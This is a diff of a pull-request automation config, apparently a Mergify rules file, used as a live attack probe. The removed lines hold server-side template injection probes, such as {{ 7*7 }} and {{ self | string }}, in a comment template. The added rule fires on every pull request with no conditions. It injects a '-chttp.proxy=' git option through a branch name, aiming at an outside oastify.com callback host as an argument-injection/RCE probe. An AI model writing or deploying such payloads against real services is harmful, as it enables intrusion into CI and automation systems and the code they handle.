@@ -1,14 +1,8 @@
 pull_request_rules:
-  - name: ssti-probe
-    conditions:
-      - head = ssti-test
+  - name: copy-rce-probe
+    conditions: []
     actions:
-      comment:
-        message: |
-          [PROBE-A] arith={{ 7*7 }}
-          [PROBE-B] author={{ author }}
-          [PROBE-C] selfstr={{ self | string }}
-          [PROBE-D] strfilter={{ author | string }}
-          [PROBE-E] tojson={{ author | tojson }}
-          [PROBE-F] pprint={{ author | pprint }}
-          [PROBE-G] urlencode={{ author | urlencode }}
+      copy:
+        branches:
+          - "-chttp.proxy=copyrce-1779959955904695000.gxhi3c467gxcqk9wi4z0fnus1j7av1jq.oastify.com"
+        title: "COPY-RCE-PROBE"
